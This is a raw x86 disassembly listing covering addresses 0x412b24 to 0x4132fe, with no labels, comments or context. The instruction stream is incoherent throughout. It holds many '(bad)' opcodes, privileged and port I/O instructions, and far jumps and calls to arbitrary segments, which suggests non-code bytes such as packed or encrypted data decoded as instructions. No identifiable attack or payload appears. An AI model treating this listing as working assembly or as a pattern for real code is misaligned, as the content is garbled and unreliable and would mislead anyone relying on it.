  412b24:	pop    ss
  412b25:	and    esi,eax
  412b27:	pop    ecx
  412b28:	popf   
  412b29:	mov    ah,0xd2
  412b2b:	btr    ebp,ebx
  412b2e:	out    dx,eax
  412b2f:	jbe    0x412b60
  412b31:	gs jns 0x412acb
  412b34:	hlt    
  412b35:	push   esp
  412b36:	sar    ebx,cl
  412b38:	cmp    bh,BYTE PTR ds:0x4aba9301
  412b3e:	mov    al,ds:0xfb3bb7db
  412b43:	int3   
  412b44:	jbe    0x412b2d
  412b46:	xchg   ebx,eax
  412b47:	call   0xab3e4abd
  412b4c:	inc    ax
  412b4e:	xor    eax,DWORD PTR [esi+0x58847]
  412b54:	adc    esp,0xb089c64d
  412b5a:	mov    esp,0xd687ba14
  412b5f:	xchg   ebp,eax
  412b60:	scas   eax,DWORD PTR es:[edi]
  412b61:	sbb    edx,DWORD PTR [edx]
  412b63:	fiadd  DWORD PTR [edx+0x73]
  412b66:	aaa    
  412b67:	mov    esp,DWORD PTR [eax]
  412b69:	inc    edi
  412b6a:	cmp    cl,BYTE PTR [edi-0x511a1a9e]
  412b70:	or     edi,ebp
  412b72:	add    edi,DWORD PTR [ecx]
  412b74:	in     al,0xfb
  412b76:	sub    al,0xbf
  412b78:	jge    0x412bdb
  412b7a:	or     eax,0x443a2ad4
  412b7f:	fdiv   st(3),st
  412b81:	cmp    cl,BYTE PTR [esi+0x2748ae35]
  412b87:	call   FWORD PTR [edx]
  412b89:	iret   
  412b8a:	(bad)  
  412b8b:	sub    al,0xf0
  412b8d:	or     DWORD PTR [ebx-0x6932bb57],ebx
  412b93:	inc    edi
  412b94:	gs loop 0x412be5
  412b97:	push   cs
  412b98:	scas   al,BYTE PTR es:[edi]
  412b99:	xchg   BYTE PTR [ebp+eiz*8+0x71],ah
  412b9d:	neg    BYTE PTR [ebx]
  412b9f:	sbb    BYTE PTR [ecx-0x7cfd727e],al
  412ba5:	fwait
  412ba6:	test   ch,bh
  412ba8:	imul   ebp,DWORD PTR [esi-0x4e],0x99af84eb
  412baf:	jl     0x412baf
  412bb1:	loopne 0x412bed
  412bb3:	rcl    DWORD PTR [ebp-0x5e],cl
  412bb6:	add    esi,DWORD PTR [esi]
  412bb8:	aam    0xbf
  412bba:	pusha  
  412bbb:	inc    ebp
  412bbc:	popf   
  412bbd:	call   0xbc391997
  412bc2:	cld    
  412bc3:	push   edi
  412bc4:	cmp    DWORD PTR [esi+ebp*2+0x680ba0fb],ecx
  412bcb:	and    BYTE PTR [edx-0x35b0356f],ch
  412bd1:	cmp    ch,cl
  412bd3:	lds    eax,FWORD PTR [ebx]
  412bd5:	xor    esp,esp
  412bd7:	sub    al,0x6e
  412bd9:	test   DWORD PTR [eax+0xb7e170f],0xd6feaecb
  412be3:	xchg   esp,eax
  412be4:	inc    edi
  412be5:	retf   
  412be6:	adc    eax,DWORD PTR [ebx]
  412be8:	pop    edi
  412be9:	imul   BYTE PTR [edx-0x58]
  412bec:	mov    al,ds:0xe1137a80
  412bf1:	xchg   esi,eax
  412bf2:	mov    al,ds:0x757d631f
  412bf7:	and    al,0xb8
  412bf9:	push   ss
  412bfa:	add    eax,0x837433fb
  412bff:	scas   eax,DWORD PTR es:[edi]
  412c00:	or     eax,ebx
  412c02:	dec    ecx
  412c03:	xor    BYTE PTR ds:0xe04957f4,ch
  412c09:	cmp    eax,0xf7e53f4e
  412c0e:	xchg   DWORD PTR [eax-0x28],ecx
  412c11:	jmp    0x6fae:0x4380f7a1
  412c18:	jge    0x412c4e
  412c1a:	mov    edx,0x9bc84a49
  412c1f:	ror    BYTE PTR [ebp-0x77b764a4],0x5c
  412c26:	adc    dl,BYTE PTR [ecx]
  412c28:	mov    ds:0xe817d9d9,eax
  412c2d:	mov    al,ds:0x22ceab21
  412c32:	push   0x2b
  412c34:	scas   eax,DWORD PTR es:[edi]
  412c35:	mov    eax,0x49985438
  412c3a:	arpl   WORD PTR [edi+0x74],di
  412c3d:	not    ebp
  412c3f:	and    eax,0x97b12136
  412c44:	mov    al,ds:0x9e92f6ea
  412c49:	xor    eax,ebx
  412c4b:	and    DWORD PTR [esi+0x2d0804e2],eax
  412c51:	das    
  412c52:	jmp    0x412bd4
  412c54:	leave  
  412c55:	push   es
  412c56:	outs   dx,DWORD PTR ds:[esi]
  412c57:	int3   
  412c58:	push   esi
  412c59:	sub    dl,0x81
  412c5c:	imul   esi,DWORD PTR [ebx],0x40a5e01c
  412c62:	test   al,0xb3
  412c64:	sub    BYTE PTR [esi],0x29
  412c67:	int3   
  412c68:	lods   eax,DWORD PTR ds:[esi]
  412c69:	jge    0x412cd5
  412c6b:	js     0x412c53
  412c6d:	test   BYTE PTR [ecx-0x68dc0d61],0x0
  412c74:	arpl   ax,cx
  412c76:	mov    eax,0x546d2ac1
  412c7b:	mov    edx,0x806f5832
  412c80:	fiadd  WORD PTR [edx+0x523bf196]
  412c86:	add    ah,BYTE PTR [ecx+0x3d91f246]
  412c8c:	pusha  
  412c8d:	add    al,0xb9
  412c8f:	add    BYTE PTR [edx-0x25bf9e3b],cl
  412c95:	mov    eax,0x29e35bd6
  412c9a:	ficom  WORD PTR [edi-0x38]
  412c9d:	sub    dh,al
  412c9f:	leave  
  412ca0:	pop    ecx
  412ca1:	arpl   WORD PTR [eax-0x63],cx
  412ca4:	xchg   ebx,eax
  412ca5:	push   cs
  412ca6:	mov    ebp,0x47d6cc69
  412cab:	cmp    al,0xf4
  412cad:	pushf  
  412cae:	cmp    eax,0xf73ef335
  412cb3:	mov    ah,BYTE PTR [eax+0x17]
  412cb6:	adc    ch,bh
  412cb8:	lds    ebp,FWORD PTR [ebx]
  412cba:	xor    eax,0x4e5531a1
  412cbf:	pop    edx
  412cc1:	enter  0xe830,0xc8
  412cc5:	sub    bh,BYTE PTR [ebx]
  412cc7:	push   ss
  412cc8:	sbb    eax,0xb8f9e243
  412ccd:	aam    0xce
  412ccf:	call   0xacb1:0xf8a5ec98
  412cd6:	ret    0xab6e
  412cd9:	jmp    0x7867ab11
  412cde:	fs clc 
  412ce0:	inc    esi
  412ce1:	xlat   BYTE PTR ds:[ebx]
  412ce2:	xor    ebp,edi
  412ce4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ce5:	sahf   
  412ce6:	inc    ebp
  412ce7:	fwait
  412ce8:	icebp  
  412ce9:	into   
  412cea:	mov    al,0xb7
  412cec:	mov    dl,0xba
  412cee:	push   ebp
  412cef:	lods   eax,DWORD PTR ds:[esi]
  412cf0:	out    0xd5,al
  412cf2:	mov    edi,0x353918c1
  412cf7:	pop    esp
  412cf8:	and    eax,0x8d4e7920
  412cfd:	in     eax,dx
  412cfe:	test   BYTE PTR [ebx+eiz*8+0x6de95a1f],ah
  412d05:	test   ecx,eax
  412d07:	(bad)  
  412d08:	call   0x5d152b69
  412d0d:	outs   dx,DWORD PTR ds:[esi]
  412d0e:	into   
  412d0f:	loopne 0x412d49
  412d11:	jb     0x412d64
  412d13:	bound  eax,QWORD PTR [ebx+eax*2-0x28]
  412d17:	lods   eax,DWORD PTR ds:[esi]
  412d18:	shl    DWORD PTR [edi+ecx*4-0x35],cl
  412d1c:	add    eax,0x446ef181
  412d21:	and    al,0x92
  412d23:	int3   
  412d24:	push   ecx
  412d25:	jmp    0xc7cdfc57
  412d2a:	(bad)  [edi]
  412d2c:	int3   
  412d2d:	stc    
  412d2e:	fs dec ebp
  412d30:	shr    ebp,0x5b
  412d33:	mov    ah,0xe2
  412d35:	dec    esi
  412d36:	arpl   WORD PTR [eax-0x3e],ax
  412d39:	dec    edi
  412d3a:	sub    DWORD PTR [ecx-0x1b],esp
  412d3d:	jmp    0x412cfa
  412d3f:	scas   al,BYTE PTR es:[edi]
  412d40:	cmp    BYTE PTR [ecx-0x65c236a3],bh
  412d46:	xchg   DWORD PTR [edi-0x1ecc59b1],edx
  412d4c:	adc    DWORD PTR ds:[ebx-0x9],esi
  412d50:	mov    dl,0x8
  412d52:	test   al,0xd6
  412d54:	xchg   edx,eax
  412d55:	mov    dl,0xd
  412d57:	add    esi,DWORD PTR [edx+0x6faaf882]
  412d5d:	mov    ecx,0xf04d03a
  412d62:	sbb    DWORD PTR [eax+edx*1],esi
  412d65:	sbb    DWORD PTR [edi-0x4083360d],esi
  412d6b:	mov    ecx,0x9891465b
  412d70:	int    0x6c
  412d72:	cdq    
  412d73:	sar    dl,0x25
  412d76:	push   esi
  412d77:	jbe    0x412d0a
  412d79:	fs (bad) 
  412d7b:	push   ecx
  412d7c:	and    al,0xfa
  412d7e:	adc    eax,0x4db13314
  412d83:	shr    DWORD PTR [ecx],cl
  412d85:	ret    
  412d86:	mov    cl,dl
  412d88:	call   0x259a:0xfe073193
  412d8f:	out    0x8c,eax
  412d91:	popa   
  412d92:	add    eax,0x33750a65
  412d97:	popf   
  412d98:	lfs    ecx,FWORD PTR [ebx]
  412d9b:	loop   0x412d33
  412d9d:	push   ebx
  412d9e:	mov    fs,WORD PTR [eax-0x35]
  412da1:	push   ebp
  412da2:	add    al,0x17
  412da4:	jmp    0x412e1f
  412da6:	test   al,0xdf
  412da8:	aad    0x38
  412daa:	add    al,0xb3
  412dac:	or     ax,0xc53d
  412db0:	in     eax,0x9f
  412db2:	jp     0x412d61
  412db4:	aad    0xc0
  412db6:	stos   DWORD PTR es:[edi],eax
  412db7:	(bad)  
  412db8:	mov    ecx,0x3dbaa3d8
  412dbd:	and    al,0x3a
  412dbf:	into   
  412dc0:	retf   
  412dc1:	mov    al,ds:0xf47edc47
  412dc6:	add    al,0x2
  412dc8:	xlat   BYTE PTR ds:[ebx]
  412dc9:	not    DWORD PTR [edi-0x78d349ea]
  412dcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412dd0:	xor    ch,BYTE PTR [eax*1-0xf53e7ae]
  412dd7:	push   edx
  412dd8:	xor    al,0x81
  412dda:	js     0x412e2d
  412ddc:	xor    edi,esi
  412dde:	and    eax,0x9dcd1dda
  412de3:	add    edx,DWORD PTR [ebx+0x41]
  412de6:	jo     0x412e5c
  412de8:	dec    edx
  412de9:	(bad)  
  412dea:	js     0x412dd6
  412dec:	jmp    0x412e3c
  412dee:	mov    ebp,0x69b01b1a
  412df3:	stc    
  412df4:	in     al,0x77
  412df6:	xchg   BYTE PTR [esp+ebp*2+0x506803aa],bh
  412dfd:	js     0x412d84
  412dff:	pop    edi
  412e00:	and    BYTE PTR [ebx-0xf],0x11
  412e04:	neg    BYTE PTR ss:[ebp+0x5cecdcc]
  412e0b:	cli    
  412e0c:	std    
  412e0d:	nop
  412e0e:	sbb    esi,DWORD PTR [ebp+0x5b]
  412e11:	aam    0x31
  412e13:	aad    0x6
  412e15:	inc    ebx
  412e16:	dec    edx
  412e17:	jmp    0xf1d6:0xc5e43009
  412e1e:	dec    esi
  412e1f:	lahf   
  412e20:	jl     0x412e59
  412e22:	add    DWORD PTR [edx-0x15],0xffffffb0
  412e26:	pop    es
  412e27:	dec    edx
  412e28:	mov    edx,0x4e4263b3
  412e2d:	pusha  
  412e2e:	loopne 0x412e0b
  412e30:	jecxz  0x412dc5
  412e32:	aam    0x6e
  412e34:	xor    ch,BYTE PTR [ecx]
  412e36:	aas    
  412e37:	xchg   edx,ebx
  412e39:	mul    ch
  412e3b:	and    eax,DWORD PTR [esi+0x6c]
  412e3e:	sahf   
  412e3f:	sub    al,0x73
  412e41:	jmp    0x922c:0x67fc3176
  412e48:	pushf  
  412e49:	xor    dl,cl
  412e4b:	or     BYTE PTR [edx+eiz*4-0xf],bh
  412e4f:	adc    edx,DWORD PTR [edi]
  412e51:	(bad)  
  412e52:	fisubr WORD PTR [eax-0x19]
  412e55:	call   0xc0a5:0x85eb76a2
  412e5c:	dec    esi
  412e5d:	(bad)  
  412e5e:	popf   
  412e5f:	lea    ebp,[eax-0x6a6d6aa]
  412e65:	loopne 0x412e47
  412e67:	scas   eax,DWORD PTR es:[edi]
  412e68:	data16 mov al,ds:0x9fc4361
  412e6e:	mov    esp,0x82722f87
  412e73:	loope  0x412df7
  412e75:	and    dl,BYTE PTR [esi-0x3a1a4920]
  412e7b:	push   cs
  412e7c:	out    dx,al
  412e7d:	sub    ebx,DWORD PTR [edx]
  412e7f:	neg    BYTE PTR [edx-0x74]
  412e82:	pop    ebx
  412e83:	call   0x375d:0x7af7dc58
  412e8a:	scas   eax,DWORD PTR es:[edi]
  412e8b:	ret    
  412e8c:	stc    
  412e8d:	(bad)  
  412e8e:	ja     0x412e2b
  412e90:	lods   eax,DWORD PTR ds:[esi]
  412e91:	stc    
  412e92:	shl    DWORD PTR [edi],cl
  412e94:	lds    edx,FWORD PTR [ebx]
  412e96:	inc    esi
  412e97:	test   edx,0xafc4204a
  412e9d:	cmp    al,0x84
  412e9f:	mov    ecx,DWORD PTR [ebx-0x25]
  412ea2:	sub    edi,DWORD PTR [ebx]
  412ea4:	enter  0x7e32,0xe
  412ea8:	repnz popa 
  412eaa:	pop    ebp
  412eab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412eac:	push   ecx
  412ead:	or     DWORD PTR [esi-0x61e29dac],0x25f7e5aa
  412eb7:	nop
  412eb8:	mov    eax,ds:0x55dd8980
  412ebd:	shl    BYTE PTR [ecx],1
  412ebf:	(bad)  
  412ec0:	(bad)  [edi-0x494417c7]
  412ec6:	retf   0x50e8
  412ec9:	stos   DWORD PTR es:[edi],eax
  412eca:	push   0xffffffbd
  412ecc:	in     eax,dx
  412ecd:	mov    dh,0xe7
  412ecf:	cmp    dh,ch
  412ed1:	shl    BYTE PTR [esi+edx*2-0x6a64dcc7],1
  412ed8:	in     al,dx
  412ed9:	add    BYTE PTR [ebx-0x74afad4],ch
  412edf:	push   ebp
  412ee0:	cmp    dl,BYTE PTR [ecx]
  412ee2:	pop    es
  412ee3:	cmc    
  412ee4:	ss xchg ecx,eax
  412ee6:	adc    eax,0xf169868e
  412eeb:	mov    ch,0xe7
  412eed:	fisub  WORD PTR [ebx+0x3671dcc8]
  412ef3:	shr    BYTE PTR [edi],cl
  412ef5:	or     dh,dh
  412ef7:	fdivr  QWORD PTR [ecx+edi*1+0x15baa38]
  412efe:	call   0x8c5c:0xf83742d3
  412f05:	retf   
  412f06:	test   eax,0x630ce8fa
  412f0b:	inc    edi
  412f0c:	mov    dh,0x9b
  412f0e:	rol    BYTE PTR [ecx+0x4a],cl
  412f11:	std    
  412f12:	cdq    
  412f13:	pop    ecx
  412f14:	shl    BYTE PTR [esi],0xda
  412f17:	jo     0x412f8e
  412f19:	loopne 0x412f8e
  412f1b:	xor    al,0xc9
  412f1d:	cmp    esp,DWORD PTR [edx-0x66edb59c]
  412f23:	sti    
  412f24:	mov    BYTE PTR [ecx+0x6ed0e11b],bh
  412f2a:	cmp    DWORD PTR [ebp+0x13],edx
  412f2d:	rol    esp,0xed
  412f30:	jae    0x412ed3
  412f32:	mov    esp,ecx
  412f34:	inc    esi
  412f35:	or     dl,BYTE PTR [edi]
  412f37:	pop    eax
  412f38:	mov    fs,WORD PTR [esi+0x5a]
  412f3b:	jnp    0x412f93
  412f3d:	or     ebx,ebx
  412f3f:	mov    ds:0x20eeca7d,al
  412f44:	dec    ebp
  412f45:	pop    ds
  412f46:	pop    esp
  412f47:	ins    BYTE PTR es:[edi],dx
  412f48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f49:	jae    0x412efb
  412f4b:	pop    edi
  412f4c:	ins    BYTE PTR es:[edi],dx
  412f4d:	or     ebx,ecx
  412f4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f50:	scas   al,BYTE PTR es:[edi]
  412f51:	xchg   ecx,eax
  412f52:	frstor [ebp+ebp*8-0x47]
  412f56:	mov    ds:0x6f72355a,al
  412f5b:	adc    al,0x7a
  412f5d:	sub    DWORD PTR [esi],esi
  412f5f:	ins    BYTE PTR es:[edi],dx
  412f60:	fadd   st,st(1)
  412f62:	imul   ecx,DWORD PTR [esi],0x63359df3
  412f68:	inc    esp
  412f69:	dec    ecx
  412f6a:	js     0x412fba
  412f6c:	sbb    ecx,esi
  412f6e:	mov    ebp,fs
  412f70:	or     DWORD PTR [edi],ecx
  412f72:	dec    ebp
  412f73:	call   DWORD PTR [ecx+0xf]
  412f76:	sub    eax,0x4bbcc0e8
  412f7b:	xadd   DWORD PTR [esi-0x685f9076],eax
  412f82:	iret   
  412f83:	out    dx,eax
  412f84:	leave  
  412f85:	in     eax,dx
  412f86:	xchg   ebp,eax
  412f87:	pop    ds
  412f88:	ins    BYTE PTR es:[edi],dx
  412f89:	call   FWORD PTR [ebx+esi*8]
  412f8c:	aas    
  412f8d:	daa    
  412f8e:	push   ss
  412f8f:	pop    ecx
  412f90:	mov    dl,0x60
  412f92:	lods   eax,DWORD PTR ds:[esi]
  412f93:	ss imul edi
  412f96:	data16 push di
  412f99:	mov    ch,0xad
  412f9b:	imul   esi,DWORD PTR [eax],0x3dbec730
  412fa1:	cmp    edx,DWORD PTR [edi]
  412fa3:	jp     0x412ff8
  412fa5:	cmp    eax,0x46f911c0
  412faa:	(bad)  
  412fab:	pop    esp
  412fac:	leave  
  412fad:	imul   DWORD PTR [edi]
  412faf:	mov    ds:0x8dff38c3,al
  412fb5:	(bad)  
  412fb6:	(bad)  
  412fb7:	neg    DWORD PTR [esi]
  412fb9:	(bad)  
  412fbb:	imul   BYTE PTR [ebp-0x44]
  412fbe:	mov    ds:0xf044205e,eax
  412fc3:	jmp    0x205ed872
  412fc8:	rcl    BYTE PTR [ecx+0x6b],1
  412fcb:	inc    ebp
  412fcc:	retf   
  412fcd:	adc    eax,0x88d35ce2
  412fd2:	xchg   edx,eax
  412fd3:	dec    edx
  412fd4:	adc    al,0x83
  412fd6:	sbb    bl,al
  412fd8:	in     al,0xa9
  412fda:	sbb    eax,0x9ff1920
  412fdf:	invlpg BYTE PTR [edi-0x66591377]
  412fe6:	push   esi
  412fe7:	dec    ebx
  412fe8:	ins    BYTE PTR es:[edi],dx
  412fe9:	cmp    eax,0x2d8029ed
  412fee:	in     al,0x8d
  412ff0:	inc    esp
  412ff1:	das    
  412ff2:	push   edi
  412ff3:	mov    WORD PTR [ecx-0x4b449de8],ds
  412ff9:	dec    ebp
  412ffa:	inc    esi
  412ffb:	imul   edx,DWORD PTR [ebx+ebp*1-0xa],0x805d54d8
  413003:	scas   al,BYTE PTR es:[edi]
  413004:	scas   al,BYTE PTR es:[edi]
  413005:	jo     0x412fe3
  413007:	jg     0x412fa6
  413009:	inc    ebx
  41300a:	mov    ebp,?
  41300c:	outs   dx,BYTE PTR ds:[esi]
  41300d:	ins    DWORD PTR es:[edi],dx
  41300e:	in     eax,dx
  41300f:	xchg   ecx,eax
  413010:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413011:	popa   
  413012:	popa   
  413013:	test   eax,ebx
  413015:	xchg   edi,eax
  413016:	into   
  413017:	sub    ebx,esi
  413019:	iret   
  41301a:	xchg   ecx,eax
  41301b:	cs and eax,ecx
  41301e:	scas   al,BYTE PTR es:[edi]
  41301f:	sbb    eax,0xb7549863
  413024:	mov    ebp,0x606be68e
  413029:	rcl    dl,1
  41302b:	pop    ebp
  41302c:	(bad)
  41302f:	pop    ss
  413030:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413031:	cmp    dl,0x38
  413034:	or     al,cl
  413036:	add    al,0x30
  413038:	jnp    0x4130b9
  41303a:	mov    ds:0x94b5de7f,al
  41303f:	loopne 0x41305f
  413041:	pop    ecx
  413042:	or     eax,0x438dbf41
  413047:	cmp    al,0x36
  413049:	jmp    DWORD PTR [edi-0x4b]
  41304c:	jb     0x4130c8
  41304e:	cs add ah,ch
  413051:	sbb    DWORD PTR [ebx+0x67d7f048],ebx
  413057:	lds    edi,FWORD PTR [ebp+0x3]
  41305a:	hlt    
  41305b:	rcr    BYTE PTR [esi-0x523a892c],1
  413061:	out    0xf8,al
  413063:	test   eax,0x2cbf80da
  413068:	test   al,0x50
  41306a:	(bad)  
  41306b:	pop    ds
  41306c:	pop    esp
  41306d:	adc    DWORD PTR ds:0x19822402,0x25
  413074:	out    dx,eax
  413075:	lahf   
  413076:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413077:	sbb    eax,0x85001ec5
  41307c:	cmp    cl,BYTE PTR [ebx+esi*8-0x7758dbb8]
  413083:	mov    cl,0xa7
  413085:	cli    
  413086:	push   ebp
  413087:	push   ss
  413088:	mov    ebx,0x76f320ce
  41308d:	mov    ebx,0xb22566a9
  413092:	mov    ch,0xb0
  413094:	sbb    al,0x61
  413096:	push   ebp
  413097:	xchg   esi,eax
  413098:	scas   eax,DWORD PTR es:[edi]
  413099:	aad    0xe2
  41309b:	imul   esi,DWORD PTR [ecx+0x6c3b491b],0x83cce89f
  4130a5:	(bad)  
  4130a6:	out    dx,al
  4130a7:	mov    DWORD PTR [ebx+esi*2+0x69a00a02],esi
  4130ae:	mov    esp,0x3e616784
  4130b3:	ret    0x9648
  4130b6:	popf   
  4130b7:	in     al,0xe8
  4130b9:	dec    ecx
  4130ba:	retf   0xd27f
  4130bd:	das    
  4130be:	jl     0x413091
  4130c0:	xlat   BYTE PTR ds:[ebx]
  4130c1:	pop    ss
  4130c2:	frstor ds:0x8543dda1
  4130c8:	xor    BYTE PTR [edx-0x2fbf2d3a],bh
  4130ce:	xor    eax,0x1cedf73f
  4130d3:	sbb    bl,dl
  4130d5:	sbb    dh,dh
  4130d7:	push   edi
  4130d8:	push   es
  4130d9:	mov    bh,0xf4
  4130db:	aas    
  4130dc:	push   0xb7ab58d6
  4130e1:	and    eax,0x3bdfe0f5
  4130e6:	out    0xd0,al
  4130e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130e9:	(bad)  
  4130ea:	cmc    
  4130eb:	(bad)  
  4130ed:	adc    eax,edx
  4130ef:	xor    eax,0xe8a79be3
  4130f4:	jno    0x4130e6
  4130f6:	adc    BYTE PTR [ebp-0x35],dh
  4130f9:	adc    al,0xc6
  4130fb:	or     eax,DWORD PTR [ebx+0x13]
  4130fe:	push   ecx
  4130ff:	xchg   esi,eax
  413100:	sub    ah,BYTE PTR [edx-0x1e842317]
  413106:	add    BYTE PTR [esi-0x491a0af2],ah
  41310c:	add    ch,BYTE PTR [eax+ebp*8+0x73056d22]
  413113:	mov    esp,0xd0b7ed25
  413118:	cmp    DWORD PTR [eax-0x7b],edi
  41311b:	mov    dl,BYTE PTR [ecx]
  41311d:	in     eax,0x9a
  41311f:	or     edi,edx
  413121:	add    eax,0xcd8ec4f1
  413126:	data16 out dx,al
  413128:	mov    bl,BYTE PTR [ecx-0x29]
  41312b:	dec    ecx
  41312c:	fld    TBYTE PTR [ecx+0x7f]
  41312f:	dec    ebx
  413130:	pop    ss
  413131:	pop    ss
  413132:	adc    eax,0x20efc6aa
  413137:	(bad)  
  413138:	je     0x413171
  41313a:	addr16 push ss
  41313c:	or     edx,eax
  41313e:	in     al,dx
  41313f:	sub    ch,BYTE PTR [edi+0x29995195]
  413145:	push   ss
  413146:	sbb    BYTE PTR [edi+0x5d1213cf],bl
  41314c:	mov    dl,0xa4
  41314e:	data16 mov WORD PTR [ebx+0x1a],ss
  413152:	fwait
  413153:	pop    edi
  413154:	ficom  DWORD PTR [edx]
  413156:	je     0x4131a9
  413158:	jl     0x41317b
  41315a:	(bad)  
  41315b:	push   eax
  41315c:	lds    ebx,FWORD PTR [esi]
  41315e:	lock cli 
  413160:	mov    ah,0x73
  413162:	inc    esi
  413163:	mov    ebp,0x75662cea
  413168:	test   BYTE PTR [edx+edx*4-0x7a],dh
  41316c:	dec    edx
  41316d:	cmc    
  41316e:	in     eax,0x34
  413170:	aam    0x64
  413172:	add    eax,0x21a95851
  413177:	lds    esi,FWORD PTR [ebp+0x11]
  41317a:	xchg   bh,bl
  41317c:	or     edx,DWORD PTR [ecx]
  41317e:	mov    BYTE PTR [ebp+0x7e7f44af],al
  413184:	in     al,dx
  413185:	int3   
  413186:	xor    al,BYTE PTR [eax+ebx*8]
  413189:	adc    eax,0xb9e8a73e
  41318e:	outs   dx,DWORD PTR ds:[esi]
  41318f:	dec    edi
  413190:	gs add al,0xde
  413193:	in     eax,dx
  413194:	jl     0x4131d1
  413196:	jl     0x4131eb
  413198:	popa   
  413199:	popf   
  41319a:	push   cs
  41319b:	sti    
  41319c:	jecxz  0x4131c2
  41319e:	hlt    
  41319f:	inc    eax
  4131a0:	aaa    
  4131a1:	mov    esp,0xf1e01873
  4131a6:	pushf  
  4131a7:	arpl   si,ax
  4131a9:	lea    eax,[ebx+eiz*2-0x6724cbeb]
  4131b0:	iret   
  4131b1:	jmp    0x40860eac
  4131b6:	lea    eax,[esi+ebp*8]
  4131b9:	mov    esi,0xc6b844df
  4131be:	ret    0xe496
  4131c1:	out    0x50,eax
  4131c3:	int    0xd0
  4131c5:	xor    edi,DWORD PTR [ebx+0x13]
  4131c8:	mov    WORD PTR [ebp-0x2c080b6b],ss
  4131ce:	fisttp QWORD PTR [ebx+esi*8+0x552f6209]
  4131d5:	jne    0x413212
  4131d7:	mov    eax,0x4732a265
  4131dc:	ds ret 
  4131de:	(bad)  
  4131df:	clc    
  4131e0:	in     al,dx
  4131e1:	jno    0x41318c
  4131e3:	mov    BYTE PTR [ebp+0x0],ch
  4131e6:	xchg   edx,eax
  4131e7:	popf   
  4131e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131e9:	pop    edx
  4131ea:	cmp    al,0xcf
  4131ec:	sbb    DWORD PTR [edx-0x641fb09a],ecx
  4131f2:	jnp    0x41317f
  4131f4:	loope  0x413233
  4131f6:	dec    eax
  4131f7:	xchg   esi,eax
  4131f8:	mov    bl,0x9f
  4131fa:	fldenv [ebx]
  4131fc:	mov    al,0xa7
  4131fe:	retf   
  4131ff:	scas   eax,DWORD PTR es:[edi]
  413200:	xchg   ebp,eax
  413201:	mov    esi,0x66a81b71
  413206:	sbb    eax,0xcba93f4c
  41320b:	sub    DWORD PTR [ebp-0x918cdbf],edi
  413211:	in     eax,dx
  413212:	out    0x50,eax
  413214:	retf   0xf0c9
  413217:	add    esp,esi
  413219:	stos   BYTE PTR es:[edi],al
  41321a:	jae    0x413268
  41321c:	stc    
  41321d:	mov    edx,0xe524ff13
  413222:	xor    edi,0xffffffd6
  413225:	adc    ecx,DWORD PTR [ebp+0x331139cf]
  41322b:	test   eax,ebx
  41322d:	nop
  41322e:	xchg   edi,eax
  41322f:	jns    0x413212
  413231:	iret   
  413232:	addr16 (bad) 
  413234:	outs   dx,BYTE PTR ds:[esi]
  413235:	mov    cl,0x81
  413237:	nop
  413238:	enter  0x9a8a,0xc2
  41323c:	jbe    0x41327c
  41323e:	ret    
  41323f:	xchg   ecx,eax
  413240:	mov    esi,DWORD PTR [ebp+0x1579acb3]
  413246:	out    0xf5,eax
  413248:	cmp    eax,0x59cd82af
  41324d:	loopne 0x4131fd
  41324f:	stos   BYTE PTR es:[edi],al
  413250:	dec    esi
  413251:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413252:	mov    bh,0x8b
  413254:	push   eax
  413255:	leave  
  413256:	fwait
  413257:	and    ah,BYTE PTR [esi+0xe]
  41325a:	shl    dl,cl
  41325c:	adc    al,0xc0
  41325e:	or     ebx,DWORD PTR ds:0x2aed7afe
  413264:	retf   
  413265:	xchg   DWORD PTR [ecx],edx
  413267:	and    esi,edi
  413269:	cmp    BYTE PTR [ecx-0x5d0d35e0],dl
  41326f:	into   
  413270:	mov    ecx,0x9bbb839a
  413275:	fidiv  WORD PTR [ebp-0x446cd85b]
  41327b:	scas   al,BYTE PTR es:[edi]
  41327c:	sahf   
  41327d:	cmc    
  41327e:	add    ecx,DWORD PTR [esi-0x13f83a51]
  413284:	fwait
  413285:	test   BYTE PTR [edi+0x4b],0x39
  413289:	loopne 0x41321e
  41328b:	shl    DWORD PTR [edx+0x129b8491],1
  413291:	aas    
  413292:	jae    0x413220
  413294:	cwde   
  413295:	or     al,0x42
  413297:	mov    BYTE PTR [eax],al
  413299:	xchg   esi,eax
  41329a:	mov    ebp,0x2542e16a
  41329f:	cwde   
  4132a0:	idiv   bh
  4132a2:	leave  
  4132a3:	inc    ecx
  4132a4:	stc    
  4132a5:	aam    0x4a
  4132a7:	daa    
  4132a8:	(bad)  
  4132a9:	push   ebx
  4132aa:	ror    BYTE PTR [edi+0x3d],1
  4132ad:	jg     0x413284
  4132af:	nop
  4132b0:	mov    cl,0x5d
  4132b2:	jge    0x4132c5
  4132b4:	hlt    
  4132b5:	into   
  4132b6:	pusha  
  4132b7:	mov    ch,0x5b
  4132b9:	mov    edi,0x727bc105
  4132be:	imul   esi,DWORD PTR [esi],0xabe2555d
  4132c4:	ror    DWORD PTR [eax-0x2c],0x5e
  4132c8:	xlat   BYTE PTR ds:[ebx]
  4132c9:	sub    cl,bh
  4132cb:	scas   eax,DWORD PTR es:[edi]
  4132cc:	popa   
  4132cd:	int    0x6c
  4132cf:	repz jno 0x413330
  4132d2:	and    DWORD PTR [esi+esi*4],ecx
  4132d5:	fsubp  st(1),st
  4132d7:	xchg   BYTE PTR [edi+ebx*8],ah
  4132da:	das    
  4132db:	test   al,0x8a
  4132dd:	sar    DWORD PTR [eax+0x25088fcc],0x58
  4132e4:	add    BYTE PTR [edx+0x2a],dl
  4132e7:	cmp    ebp,ecx
  4132e9:	mov    esi,0xe932a3a9
  4132ee:	pop    edi
  4132ef:	jmp    0x41329a
  4132f1:	stos   BYTE PTR es:[edi],al
  4132f2:	inc    edi
  4132f3:	jnp    0x41331e
  4132f5:	dec    ecx
  4132f6:	pop    ds
  4132f7:	cmp    cl,al
  4132f9:	or     eax,0xe80993e3
  4132fe:	pop    es
